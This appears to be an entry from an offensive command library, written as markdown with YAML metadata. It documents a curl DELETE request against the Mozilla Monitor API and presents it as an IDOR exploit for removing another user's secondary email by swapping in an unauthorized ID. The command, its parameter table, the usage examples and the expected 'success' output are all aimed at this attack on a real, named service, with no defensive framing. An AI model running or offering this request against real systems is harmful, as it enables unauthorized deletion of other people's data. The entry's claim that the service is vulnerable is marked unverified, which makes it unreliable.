---
id: cmd-curl-delete-email-idor
data: >-
  curl -X DELETE 'https://monitor.mozilla.org/api/emails/12345' -H
  'Authorization: Bearer YOUR_TOKEN' -H 'Content-Type: application/json'
tags:
  - web
  - api
  - exploit
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:47.426Z'
verified: false
validated: true
submitted: true
---
# curl-delete-email-idor

## Command

```bash
curl -X DELETE 'https://monitor.mozilla.org/api/emails/12345' -H 'Authorization: Bearer YOUR_TOKEN' -H 'Content-Type: application/json'
```

## Description

This command sends a DELETE request to the Mozilla Monitor API to remove a secondary email by ID, exploiting IDOR by using an unauthorized ID while authenticated.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X DELETE` | Specifies the HTTP method | Yes |
| `https://monitor.mozilla.org/api/emails/12345` | Endpoint with target email ID | Yes |
| `-H 'Authorization: Bearer YOUR_TOKEN'` | Authentication header | Yes |
| `-H 'Content-Type: application/json'` | Request content type | Yes |

## Examples

### Basic Usage

```bash
curl -X DELETE 'https://monitor.mozilla.org/api/emails/12345' -H 'Authorization: Bearer YOUR_TOKEN' -H 'Content-Type: application/json'
```

### Advanced Usage

```bash
curl -X DELETE 'https://monitor.mozilla.org/api/emails/12345' -H 'Authorization: Bearer YOUR_TOKEN' -H 'Content-Type: application/json' -v
```

## Expected Output

HTTP 204 No Content or success message if deletion succeeds, indicating IDOR exploitation.

## Related

- [[Related Procedure]]
